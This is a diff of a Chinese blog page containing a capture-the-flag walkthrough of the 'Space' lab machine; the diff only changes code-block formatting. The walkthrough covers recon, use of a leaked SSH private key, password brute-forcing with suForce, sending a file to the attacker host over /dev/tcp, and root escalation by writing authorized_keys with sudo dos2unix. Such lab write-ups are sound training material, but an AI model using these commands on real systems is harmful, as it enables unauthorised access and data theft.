@@ -727,7 +727,7 @@ flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
 <meta property="og:url" content="https://pingsag3.github.io/post/qun-zhu-ba-ji-%20Space%2020250623.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>群主靶机 Space 20250623</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -798,47 +798,44 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=
 </code></pre>
-<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️
-知识点：信息收集，`私钥`利用，`suForce`密码爆破，`dos2unix`提权，写`公钥`
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️
+知识点：信息收集，<span class="pl-s"><span class="pl-pds">`</span>私钥<span class="pl-pds">`</span></span>利用，<span class="pl-s"><span class="pl-pds">`</span>suForce<span class="pl-pds">`</span></span>密码爆破，<span class="pl-s"><span class="pl-pds">`</span>dos2unix<span class="pl-pds">`</span></span>提权，写<span class="pl-s"><span class="pl-pds">`</span>公钥<span class="pl-pds">`</span></span></pre></div>
 <h3>2. 信息收集</h3>
 <h5>Nmap</h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
 192.168.31.229  08:00:27:c5:06:9a       PCS Systemtechnik GmbH
-└─# IP=192.168.31.229
-└─# nmap -sV -sC -A $IP -Pn
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.229</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:18 CST
-Nmap scan report for Space (192.168.31.229)
+Nmap scan report <span class="pl-k">for</span> Space (192.168.31.229)
 Host is up (0.0014s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-| ssh-hostkey:
-|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
-|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
-|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
-80/tcp open  http    Apache httpd 2.4.62 ((Debian))
-|_http-server-header: Apache/2.4.62 (Debian)
-| http-cookie-flags:
-|   /:
-|     PHPSESSID:
-|_      httponly flag not set
-|_http-title: Typing Challenge
-MAC Address: 08:00:27:C5:06:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-</code></pre>
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+<span class="pl-k">|</span> http-cookie-flags:
+<span class="pl-k">|</span>   /:
+<span class="pl-k">|</span>     PHPSESSID:
+<span class="pl-k">|</span>_      httponly flag not <span class="pl-c1">set</span>
+<span class="pl-k">|</span>_http-title: Typing Challenge
+MAC Address: 08:00:27:C5:06:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
 <p>开放了<code class="notranslate">22、80</code>端口,先看看<code class="notranslate">80</code>有啥东西</p>
 <h3>3.目录扫描</h3>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html
-└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html</span>
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
 [21:18:51] Starting:
-[21:18:59] 302 -    0B  - /check.php  -&gt;  index.php
+[21:18:59] 302 -    0B  - /check.php  -<span class="pl-k">&gt;</span>  index.php
 [21:19:03] 200 -    3KB - /index.php
 [21:19:03] 200 -    3KB - /index.php/login/
 
-#Challenge Complete!
-Congratulations! You have successfully completed the challenge.
-Your reward: /var/www/html/andeli.id_rsa
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span>Challenge Complete!</span>
+Congratulations<span class="pl-k">!</span> You have successfully completed the challenge.
+Your reward: /var/www/html/andeli.id_rsa</pre></div>
 <p>习惯性扫目录没啥明显有用信息，直接访问主页是打字挑战页面，根据提示复制5句话后获得提示信息：网站根目录<code class="notranslate">/var/www/html/andeli.id_rsa</code>下有私钥</p>
 <p>把私钥取下来</p>
 <pre class="notranslate"><code class="notranslate">└─# curl http://$IP/andeli.id_rsa
@@ -889,56 +886,53 @@ Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==
 #ssh &lt;私钥账户名&gt;@ip -i &lt;私钥&gt;
 </code></pre>
 <p>通过私钥解出公钥，再通过私钥登陆账户<code class="notranslate">andeli</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# echo '&lt;私钥&gt;' &gt; id
-└─# chmod 600 id
-└─# ssh-keygen -y -f id
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> echo '&lt;私钥&gt;' &gt; id</span>
+└─<span class="pl-c"><span class="pl-c">#</span> chmod 600 id</span>
+└─<span class="pl-c"><span class="pl-c">#</span> ssh-keygen -y -f id</span>
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnfC0nbu5Bq1wz718/yBkJPuKhVtKYUzkxZln7hln8AmzB+4j2d3MAO8mCtWAKPb/+8c7seVrRXhLucdxysUtW4fHPG1xNeIhMqaj5LQ3S4G7Q12TMXC+ZM+pHi0b+nUbp+C31+az22rD8DYRh/kyT9wO/07CEaV1QCtBkP0N39nLtmdEaEFUeb8dPFvAJp3Sfg6v348RTMlvlTD4YbwDc/QnXbwFSUjGPgzb8jvr2rfFIbgS5P2SoAlcJ3EC8jNno4h8Qj3IWhE9sMsR773nLnOhCkfphqvkuqIr5f5ifFJxZbAJ7evgFAkKIdPsuMgrQcflhQyQVyvu31C83K3O0k+valVARP1R2SI3bu7YMLKBXDnLWrSs/d8KwRkMJQnFx+Of09nDkhHOolw7UE8gVpw+m+/+NYjUMDWyZ3T7Gv8BRYQEvjz3YZnqExHi40uW9raI+hOzhx9m2F5xdZ3QiYLJZxJ7pLmkU1Zn4L+7tN3uXjrGGU3pPD83afW9Cu6k= andeli@Space
-└─# ssh andeli@$IP -i id
-The authenticity of host '192.168.31.229 (192.168.31.229)' can't be established.
-ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
-This host key is known by the following other names/addresses:
-    ~/.ssh/known_hosts:36: [hashed name]
-    (7 additional names omitted)
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.31.229' (ED25519) to the list of known hosts.
-Linux Space 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-andeli@Space:~$ id
-uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
-</code></pre>
+└─<span class="pl-c"><span class="pl-c">#</span> ssh andeli@$IP -i id</span>
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.31.229 (192.168.31.229)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span>
+<span class="pl-s">This host key is known by the following other names/addresses:</span>
+<span class="pl-s">    ~/.ssh/known_hosts:36: [hashed name]</span>
+<span class="pl-s">    (7 additional names omitted)</span>
+<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.31.229<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
+<span class="pl-s">Linux Space 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="pl-s"></span>
+<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="pl-s">the exact distribution terms for each program are described in the</span>
+<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
+<span class="pl-s"></span>
+<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="pl-s">permitted by applicable law.</span>
+<span class="pl-s">andeli@Space:~$ id</span>
+<span class="pl-s">uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)</span></pre></div>
 <p>直接<code class="notranslate">私钥</code>去登陆获得<code class="notranslate">user.txt</code></p>
 <h5>拿到<code class="notranslate">user.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">andeli@Space:~$ id
+<div class="highlight highlight-source-shell"><pre class="notranslate">andeli@Space:<span class="pl-k">~</span>$ id
 uid=1000(andeli) gid=1000(andeli) groups=1000(andeli)
-andeli@Space:~$ cd
-andeli@Space:~$ ls
+andeli@Space:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+andeli@Space:<span class="pl-k">~</span>$ ls
 user_data.json  user.txt
-andeli@Space:~$ cat user.txt
-flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
-</code></pre>
+andeli@Space:<span class="pl-k">~</span>$ cat user.txt
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}</pre></div>
 <h3>5.获得<code class="notranslate">a3170</code>权限</h3>
 <p>获取<code class="notranslate">andeli</code>权限后发现<code class="notranslate">home</code>目录下有<code class="notranslate">user_data.json</code>文件，里面是账户密码信息，使用本机自带的<code class="notranslate">jq</code>提取密码字典</p>
 <h5>提取密码字典</h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">#使用jq提取密码字典
-andeli@Space:~$ jq --version
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>使用jq提取密码字典</span>
+andeli@Space:<span class="pl-k">~</span>$ jq --version
 jq-1.6
-andeli@Space:~$ jq -r '.[].password' user_data.json &gt; pass.txt
-andeli@Space:~$ cat pass.txt
+andeli@Space:<span class="pl-k">~</span>$ jq -r <span class="pl-s"><span class="pl-pds">'</span>.[].password<span class="pl-pds">'</span></span> user_data.json <span class="pl-k">&gt;</span> pass.txt
+andeli@Space:<span class="pl-k">~</span>$ cat pass.txt
 6fz9Y2qPWfwYqlIZns9Y
 9RqH4tBKCjh58K1wbtCd
-#也可以使用 grep + awk（无jq时）
-andeli@Space:~$ grep '"password":' user_data.json | awk -F '"' '{print $4}' &gt; pass1.txt
-andeli@Space:~$ md5sum pass.txt
+<span class="pl-c"><span class="pl-c">#</span>也可以使用 grep + awk（无jq时）</span>
+andeli@Space:<span class="pl-k">~</span>$ grep <span class="pl-s"><span class="pl-pds">'</span>"password":<span class="pl-pds">'</span></span> user_data.json <span class="pl-k">|</span> awk -F <span class="pl-s"><span class="pl-pds">'</span>"<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $4}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> pass1.txt
+andeli@Space:<span class="pl-k">~</span>$ md5sum pass.txt
 8aebc48147dbc2af5f430105532fe36a  pass.txt
-andeli@Space:~$ md5sum pass1.txt
-8aebc48147dbc2af5f430105532fe36a  pass1.txt
-</code></pre>
+andeli@Space:<span class="pl-k">~</span>$ md5sum pass1.txt
+8aebc48147dbc2af5f430105532fe36a  pass1.txt</pre></div>
 <h5><code class="notranslate">suForce</code>密码爆破</h5>
 <pre class="notranslate"><code class="notranslate">## Download suForce
 cd /dev/shm
@@ -952,139 +946,132 @@ chmod +x suForce
 ./suForce -u &lt;USER&gt; -w &lt;WORDLIST&gt;
 </code></pre>
 <p>尝试使用<code class="notranslate">suForce</code>直接爆破<code class="notranslate">root</code>密码</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">kali└─# python3 -m http.server 80
+<div class="highlight highlight-source-shell"><pre class="notranslate">kali└─<span class="pl-c"><span class="pl-c">#</span> python3 -m http.server 80</span>
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.31.229 - - [23/Jun/2025 21:50:42] "GET /suForce HTTP/1.1" 200 -
+192.168.31.229 - - [23/Jun/2025 21:50:42] <span class="pl-s"><span class="pl-pds">"</span>GET /suForce HTTP/1.1<span class="pl-pds">"</span></span> 200 -
 
-andeli@Space:~$ busybox wget 192.168.31.126/suForce
+andeli@Space:<span class="pl-k">~</span>$ busybox wget 192.168.31.126/suForce
 Connecting to 192.168.31.126 (192.168.31.126:80)
-suForce              100% |************************************************************************|  2430  0:00:00 ETA
-andeli@Space:~$ ls
+suForce              100% <span class="pl-k">|</span><span class="pl-k">************************************************************************</span><span class="pl-k">|</span>  2430  0:00:00 ETA
+andeli@Space:<span class="pl-k">~</span>$ ls
 pass.txt  suForce  user_data.json  user.txt
-andeli@Space:~$ chmod +x suForce
-andeli@Space:~$ ./suForce -u root -w pass.txt
+andeli@Space:<span class="pl-k">~</span>$ chmod +x suForce
+andeli@Space:<span class="pl-k">~</span>$ ./suForce -u root -w pass.txt
             _____
- ___ _   _ |  ___|__  _ __ ___ ___
-/ __| | | || |_ / _ \| '__/ __/ _ \
-\__ \ |_| ||  _| (_) | | | (_|  __/
-|___/\__,_||_|  \___/|_|  \___\___|
+ ___ _   _ <span class="pl-k">|</span>  ___<span class="pl-k">|</span>__  _ __ ___ ___
+/ __<span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">||</span> <span class="pl-k">|</span>_ / _ <span class="pl-cce">\|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ __/ _ \</span>
+<span class="pl-s">\__ \ |_| ||  _| (_) | | | (_|  __/</span>
+<span class="pl-s">|___/\__,_||_|  \___/|_|  \___\___|</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s"> code: d4t4s3c     version: v1.0.0</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s">🎯 Username | root</span>
+<span class="pl-s">📖 Wordlist | pass.txt</span>
+<span class="pl-s">🔎 Status   | 199/199/100%/awmFURHhByAAlPJQKveg</span>
+<span class="pl-s">❗ Fuck!    | Password not found</span>
+<span class="pl-s">───────────────────────────────────</span>
+<span class="pl-s">#后面发现不是爆破root，是a3170账户</span>
+<span class="pl-s">andeli@Space:~$ ./suForce -u a3170 -w pass.txt</span>
+<span class="pl-s">            _____</span>
+<span class="pl-s"> ___ _   _ |  ___|__  _ __ ___ ___</span>
+<span class="pl-s">/ __| | | || |_ / _ \| <span class="pl-pds">'</span></span>__/ __/ _ \
+<span class="pl-cce">\_</span>_ <span class="pl-cce">\ </span><span class="pl-k">|</span>_<span class="pl-k">|</span> <span class="pl-k">||</span>  _<span class="pl-k">|</span> (_) <span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> (_<span class="pl-k">|</span>  __/
+<span class="pl-k">|</span>___/<span class="pl-cce">\_</span>_,_<span class="pl-k">||</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>__/<span class="pl-k">|</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>__<span class="pl-cce">\_</span>__<span class="pl-k">|</span>
 ───────────────────────────────────
  code: d4t4s3c     version: v1.0.0
 ───────────────────────────────────
-🎯 Username | root
-📖 Wordlist | pass.txt
-🔎 Status   | 199/199/100%/awmFURHhByAAlPJQKveg
-❗ Fuck!    | Password not found
-───────────────────────────────────
-#后面发现不是爆破root，是a3170账户
-andeli@Space:~$ ./suForce -u a3170 -w pass.txt
-            _____
- ___ _   _ |  ___|__  _ __ ___ ___
-/ __| | | || |_ / _ \| '__/ __/ _ \
-\__ \ |_| ||  _| (_) | | | (_|  __/
-|___/\__,_||_|  \___/|_|  \___\___|
-───────────────────────────────────
- code: d4t4s3c     version: v1.0.0
-───────────────────────────────────
-🎯 Username | a3170
-📖 Wordlist | pass.txt
-🔎 Status   | 111/199/55%/31703170317031703170
-💥 Password | 31703170317031703170
-───────────────────────────────────
-</code></pre>
+🎯 Username <span class="pl-k">|</span> a3170
+📖 Wordlist <span class="pl-k">|</span> pass.txt
+🔎 Status   <span class="pl-k">|</span> 111/199/55%/31703170317031703170
+💥 Password <span class="pl-k">|</span> 31703170317031703170
+───────────────────────────────────</pre></div>
 <p>测试使用<code class="notranslate">suForce</code>直接爆破<code class="notranslate">root、</code>andeli密码，把<code class="notranslate">user_data.json</code>文件取到本地留着备用</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">andeli@Space:~$ cat user_data.json &gt; /dev/tcp/192.168.31.126/1234
+<div class="highlight highlight-source-shell"><pre class="notranslate">andeli@Space:<span class="pl-k">~</span>$ cat user_data.json <span class="pl-k">&gt;</span> /dev/tcp/192.168.31.126/1234
 
-└─# nc -lvp 1234 &gt; user_data.json
+└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234 &gt; user_data.json</span>
 listening on [any] 1234 ...
 connect to [192.168.31.126] from Space [192.168.31.229] 40782
-└─# ls user_data.json
-└─# cp user_data.json /mnt/c/Users/family/Desktop/
-
-</code></pre>
+└─<span class="pl-c"><span class="pl-c">#</span> ls user_data.json</span>
+└─<span class="pl-c"><span class="pl-c">#</span> cp user_data.json /mnt/c/Users/family/Desktop/</span>
+</pre></div>
 <p><code class="notranslate">/etc/passwd</code>发现用户<code class="notranslate">a3170</code>,搜索<code class="notranslate">user_data.json</code>有<code class="notranslate">a3170</code>的关键字，直接获得密码</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">andeli@Space:~$ cat /etc/passwd
+<div class="highlight highlight-source-shell"><pre class="notranslate">andeli@Space:<span class="pl-k">~</span>$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 ......
 andeli:x:1000:1000:,,,:/home/andeli:/bin/bash
 a3170:x:1001:1001:,,,:/home/a3170:/bin/bash
-andeli@Space:~$
-andeli@Space:~$ cat user_data.json | grep 3170
-    "password": "31703170317031703170",
-andeli@Space:~$ su - a3170
+andeli@Space:<span class="pl-k">~</span>$
+andeli@Space:<span class="pl-k">~</span>$ cat user_data.json <span class="pl-k">|</span> grep 3170
+    <span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>31703170317031703170<span class="pl-pds">"</span></span>,
+andeli@Space:<span class="pl-k">~</span>$ su - a3170
 Password:
-a3170@Space:~$ id
+a3170@Space:<span class="pl-k">~</span>$ id
 uid=1001(a3170) gid=1001(a3170) groups=1001(a3170)
-a3170@Space:~$ cd
-a3170@Space:~$ ls
-a3170@Space:~$ sudo -l
-Matching Defaults entries for a3170 on Space:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+a3170@Space:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span>
+a3170@Space:<span class="pl-k">~</span>$ ls
+a3170@Space:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User a3170 may run the following commands on Space:
-    (ALL) NOPASSWD: /usr/bin/dos2unix
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/dos2unix</pre></div>
 <p>拿到<code class="notranslate">a3170</code>的密码<code class="notranslate">a3170/31703170317031703170</code>，登录后可以<code class="notranslate">sudo</code>发运行 <code class="notranslate">/usr/bin/dos2unix</code></p>
 <h3>6.获得<code class="notranslate">root</code>权限</h3>
 <p><code class="notranslate">sudo</code>发现所有用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/usr/bin/dos2unix</code></p>
-<pre lang="shell" class="notranslate"><code class="notranslate">a3170@Space:~$ sudo -l
-Matching Defaults entries for a3170 on Space:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<div class="highlight highlight-source-shell"><pre class="notranslate">a3170@Space:<span class="pl-k">~</span>$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> a3170 on Space:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User a3170 may run the following commands on Space:
-    (ALL) NOPASSWD: /usr/bin/dos2unix
-</code></pre>
+    (ALL) NOPASSWD: /usr/bin/dos2unix</pre></div>
 <p>查表，<code class="notranslate">dos2unix</code>可以写文件，现成的提权方案</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#`dos2unix`提权
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>`dos2unix`提权</span>
 LFILE1=file_to_read
 LFILE2=file_to_write
-dos2unix -f -n "$LFILE1" "$LFILE2"
-</code></pre>
+dos2unix -f -n <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$LFILE1</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$LFILE2</span><span class="pl-pds">"</span></span></pre></div>
 <p>直接写个公钥</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">a3170@Space:~$ ssh-keygen -t rsa
+<div class="highlight highlight-source-shell"><pre class="notranslate">a3170@Space:<span class="pl-k">~</span>$ ssh-keygen -t rsa
 Generating public/private rsa key pair.
-Enter file in which to save the key (/home/a3170/.ssh/id_rsa):
-Created directory '/home/a3170/.ssh'.
-Enter passphrase (empty for no passphrase):
+Enter file <span class="pl-k">in</span> which to save the key (/home/a3170/.ssh/id_rsa):
+Created directory <span class="pl-s"><span class="pl-pds">'</span>/home/a3170/.ssh<span class="pl-pds">'</span></span>.
+Enter passphrase (empty <span class="pl-k">for</span> no passphrase):
 Enter same passphrase again:
-Your identification has been saved in /home/a3170/.ssh/id_rsa
-Your public key has been saved in /home/a3170/.ssh/id_rsa.pub
+Your identification has been saved <span class="pl-k">in</span> /home/a3170/.ssh/id_rsa
+Your public key has been saved <span class="pl-k">in</span> /home/a3170/.ssh/id_rsa.pub
 The key fingerprint is:
 SHA256:knoi0lcBR1t7RVuovtT4PYTdEIUbvpxx9n83Pyh87DA a3170@Space
-The key's randomart image is:
-+---[RSA 3072]----+
-|    ..o .  .o..o.|
-|     o o . ..o+  |
-|      o . .... + |
-|       o ..   = o|
-|      + S. o + O.|
-| .   o .  + o * o|
-|. o + .  ..E.o. .|
-| . o o    .o++oo+|
-|            +. .B|
-+----[SHA256]-----+
-a3170@Space:~$ cd .ssh
-a3170@Space:~/.ssh$ ls
-id_rsa  id_rsa.pub
-a3170@Space:~/.ssh$ sudo dos2unix -f -n "id_rsa.pub" "/root/.ssh/authorized_keys"
-dos2unix: converting file id_rsa.pub to file /root/.ssh/authorized_keys in Unix format...
-a3170@Space:~/.ssh$
-a3170@Space:~/.ssh$ ssh root@127.0.0.1
-Last login: Sat Jun 21 20:27:39 2025 from 192.168.3.94
-root@Space:~# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
+The key<span class="pl-s"><span class="pl-pds">'</span>s randomart image is:</span>
+<span class="pl-s">+---[RSA 3072]----+</span>
+<span class="pl-s">|    ..o .  .o..o.|</span>
+<span class="pl-s">|     o o . ..o+  |</span>
+<span class="pl-s">|      o . .... + |</span>
+<span class="pl-s">|       o ..   = o|</span>
+<span class="pl-s">|      + S. o + O.|</span>
+<span class="pl-s">| .   o .  + o * o|</span>
+<span class="pl-s">|. o + .  ..E.o. .|</span>
+<span class="pl-s">| . o o    .o++oo+|</span>
+<span class="pl-s">|            +. .B|</span>
+<span class="pl-s">+----[SHA256]-----+</span>
+<span class="pl-s">a3170@Space:~$ cd .ssh</span>
+<span class="pl-s">a3170@Space:~/.ssh$ ls</span>
+<span class="pl-s">id_rsa  id_rsa.pub</span>
+<span class="pl-s">a3170@Space:~/.ssh$ sudo dos2unix -f -n "id_rsa.pub" "/root/.ssh/authorized_keys"</span>
+<span class="pl-s">dos2unix: converting file id_rsa.pub to file /root/.ssh/authorized_keys in Unix format...</span>
+<span class="pl-s">a3170@Space:~/.ssh$</span>
+<span class="pl-s">a3170@Space:~/.ssh$ ssh root@127.0.0.1</span>
+<span class="pl-s">Last login: Sat Jun 21 20:27:39 2025 from 192.168.3.94</span>
+<span class="pl-s">root@Space:~# id</span>
+<span class="pl-s">uid=0(root) gid=0(root) groups=0(root)</span></pre></div>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">root@Space:~# id
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
 uid=0(root) gid=0(root) groups=0(root)
-root@Space:~# cd
-root@Space:~# ls
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cd</span>
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls</span>
 root.txt
-root@Space:~# cat root.txt
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
 flag{root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99}
-root@Space:~# cat /home/andeli/user.txt
-flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
-</code></pre></div>
+root@Space:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/andeli/user.txt</span>
+flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
